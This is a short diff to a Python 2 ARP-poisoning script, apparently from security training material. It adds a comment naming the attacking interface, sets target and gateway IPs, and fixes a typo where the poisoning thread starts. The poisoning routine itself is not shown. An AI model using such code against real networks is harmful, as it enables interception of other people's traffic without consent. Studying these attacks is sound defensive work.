@@ -4,7 +4,8 @@ import sys
 import threading
 import signal
 
-interface = "en1"
+# set variables
+interface = "en1"  # interface to attack out of
 target_ip = "172.16.1.71"
 gateway_ip = "172.16.1.254"
 packet_count = 1000
@@ -85,7 +86,7 @@ else:
     print "[*] Target %s is at %s" % (target_ip,target_mac)
 
 # start poison thread
-poison_thread = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac, target_ip, targte_mac))
+poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
 poison_thread.start()
 
 try:
